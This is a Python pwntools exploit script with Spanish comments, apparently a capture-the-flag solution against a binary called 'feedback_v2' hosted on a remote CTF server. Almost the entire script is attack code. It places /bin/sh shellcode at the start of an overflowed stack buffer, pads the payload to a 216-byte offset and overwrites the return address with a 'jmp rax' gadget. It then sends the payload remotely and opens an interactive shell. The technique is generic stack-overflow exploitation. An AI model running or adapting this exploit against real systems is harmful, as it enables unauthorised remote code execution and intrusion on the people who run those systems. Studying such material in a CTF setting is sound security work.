from pwn import *
import sys

# --- Configuración ---
try:
    context.binary = elf = ELF('./feedback_v2')
    context.arch = elf.arch
except FileNotFoundError:
    print("[-] Error: Binario './feedback_v2' no encontrado.")
    context.arch = 'amd64' # Asumiendo 64 bits
    elf = None

# context.log_level = 'debug' # Más detalles si es necesario
context.log_level = 'info'

# --- Conexión ---
HOST = 'ctf.hackademics-forum.com'
PORT = 51425
# p = process('./feedback_v2') # Ejecución local
p = remote(HOST, PORT)     # Conexión remota

# --- Constantes ---
# Offset para sobrescribir la dirección de retorno (RIP)
# (Tamaño buffer local_d8 + tamaño saved rbp = 208 + 8 = 216)
OFFSET_RET = 216
log.info(f"Usando OFFSET_RET = {OFFSET_RET}")

# Gadget encontrado en la lista que salta a la dirección en RAX
# Puedes usar 0x4010cc (jmp rax) o 0x401010 (call rax). jmp es ligeramente más simple.
JMPRAX_GADGET = 0x00000000004010cc
log.info(f"Usando gadget 'jmp rax' en: {hex(JMPRAX_GADGET)}")

# --- Shellcode ---
# Shellcode estándar de pwntools para ejecutar /bin/sh en amd64
shellcode = asm(shellcraft.amd64.sh())
log.info(f"Longitud del shellcode: {len(shellcode)} bytes")
# print(disasm(shellcode)) # Descomenta para ver el shellcode

# --- Construir Payload ---
payload = b''
payload += shellcode # El shellcode va al principio del buffer

# Relleno: Necesitamos llenar desde el final del shellcode
# hasta justo antes de la dirección de retorno (RIP).
# El espacio total hasta RIP es OFFSET_RET bytes.
padding_len = OFFSET_RET - len(shellcode)

if padding_len < 0:
    log.error(f"¡El shellcode ({len(shellcode)} bytes) es demasiado largo para caber antes de RIP (offset {OFFSET_RET})!")
    sys.exit(1)

# Añadir el padding. Este padding llenará el resto de local_d8 y sobrescribirá el saved RBP.
payload += b'A' * padding_len
log.info(f"Añadidos {padding_len} bytes de padding.")

# Sobrescribir la dirección de retorno (RIP) con la dirección del gadget jmp rax
payload += p64(JMPRAX_GADGET)
log.info(f"Payload total construido con longitud: {len(payload)} bytes (Shellcode + Padding + RIP)")

# --- Enviar Payload ---
log.info("Enviando Payload (Shellcode al inicio + jmp rax en RIP)...")
try:
    # Espera el prompt que termina en ':'
    p.sendlineafter(b':', payload)
    log.success("Payload enviado.")
except EOFError:
    log.error("La conexión se cerró antes de poder enviar el payload. ¿El servidor está activo? ¿Offset incorrecto?")
    sys.exit(1)
except Exception as e:
    log.error(f"Ocurrió un error al enviar: {e}")
    sys.exit(1)


# --- Interactuar ---
log.success("Si la hipótesis de 'gets -> rax -> jmp rax' es correcta y el offset es bueno, deberías tener una shell ahora.")
p.interactive() # Abre una sesión interactiva con la shell remota
